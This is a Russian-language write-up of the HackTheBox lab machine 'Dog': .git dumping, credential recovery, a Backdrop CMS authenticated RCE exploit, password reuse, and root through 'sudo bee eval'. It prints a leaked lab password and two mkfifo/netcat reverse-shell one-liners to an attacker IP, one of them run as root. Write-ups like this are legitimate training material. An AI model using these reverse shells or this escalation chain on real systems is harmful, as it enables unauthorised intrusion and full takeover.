# Dog (2025)

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure></div>

## Тэги:

* `Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)`
* Каталог `/.git/`
* Повышение привилегий с помощью `sudo bee`

## Содержание:

При сканировании портов было обнаружено `2` открытых tcp-порта: `22` и `80`. На веб-порте присутствует `git`-репозиторий, который можно скачать с помощью утилиты `git-dumper`, и `CMS Backdrop`. В репозитории есть исходный код приложения с именем и паролем пользователя `tiffany`. Данная УЗ подошла для входа в `CMS`. Далее был использован эксплоит для получения первоначального доступа. В каталоге `/home` были обнаружены два домашних каталога пользователей. Пароль от УЗ `tiffany` подошёл к одному из них. Новый пользователь имел возможность запускать утилиту `bee` от лица суперпользователя и выполнять `php`-код. Таким образом были повышены привилегии до уровня `root`.

## Разведка

При сканировании было обнаружено `2` открытых `tcp`-порта, а с помощью скриптов найден `.git`-репозиторий на одном из них:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure></div>

На веб-порте расположена `CMS`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure></div>

Её название можно увидеть в самом низу страницы - `Backdrop CMS`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure></div>

Скачать репозиторий можно с помощью утилиты `git_dumper`:

{% embed url="https://github.com/arthaud/git-dumper" %}

При запуске нужно указать ссылку на `.git` каталог и место, куда он будет сохранён:

<div data-full-width="false" data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure></div>

Содержимое скачанного репозитория:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure></div>

В `php`-файлах можно найти пароль от пользователя `root` для сервиса `mysql`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure></div>

С помощью утилиты `git` можно посмотреть историю изменений:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure></div>

С помощью `git show` можно посмотреть изменения конкретного коммита:

```shellscript
$ git show 8204779c764abd4c9d8d95038b6d22b6a7515afa
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure></div>

В истории видна почта пользователя `root`, где `dog.htb` - это домен. Используя эту информацию, можно найти ещё одного пользователя:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure></div>

С этими данными можно попробовать авторизоваться в `CMS`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure></div>

```
tiffany:BackDropJ2024DS2024
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure></div>

## Получение первоначального доступа (www-data)

После успешного входа можно определить версию `Backdrop CMS (Reports -> Available Updates -> List available updates)` для дальнейшего поиска эксплойта:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure></div>

На [exploit-db](https://www.exploit-db.com) был найден эксплоит для версии `1.27.1 Backdrop CMS`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure></div>

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure></div>

Однако по каким-то причинам он работал неправильно. Поэтому был использован другой эксплоит с `GitHub`:

{% embed url="https://github.com/rvizx/backdrop-rce" %}

В качестве аргументов для эксплоита нужно указать URL-адрес цели, имя пользователя и пароль:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure></div>

Для удобства была также проброшена и стабилизирована дополнительная оболочка через `mkfifo`:

```shellscript
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 9898 >/tmp/f

$ python3 -c 'import pty;pty.spawn("/bin/bash");'
$ export TERM=xterm
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure></div>

## Повышение привилегий - johncusack (Password Reuse)

В каталоге `/home` были обнаружены два домашних каталога пользователей `jobert` и `johncusack`. К одному из них подошел предыдущий пароль от `tiffany`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure></div>

## Повышение привилегий - root (sudo bee)

Пользователь `johncusack` может запускать утилиту `bee` от лица суперпользователя:

```shellscript
$ sudo -l
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (45) (1).png" alt=""><figcaption></figcaption></figure></div>

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure></div>

В данной утилите есть опция `eval`, которая позволяет выполнять `php`-код:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure></div>

Таким образом можно организовать реверс шелл от лица суперпользователя:

```shellscript
$ sudo bee --root=/var/www/html/ eval 'system("rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|bash -i 2>&1|nc 10.10.14.13 9999 >/tmp/ff")'
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure></div>

Проверка сессии:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (49) (1).png" alt=""><figcaption></figcaption></figure></div>

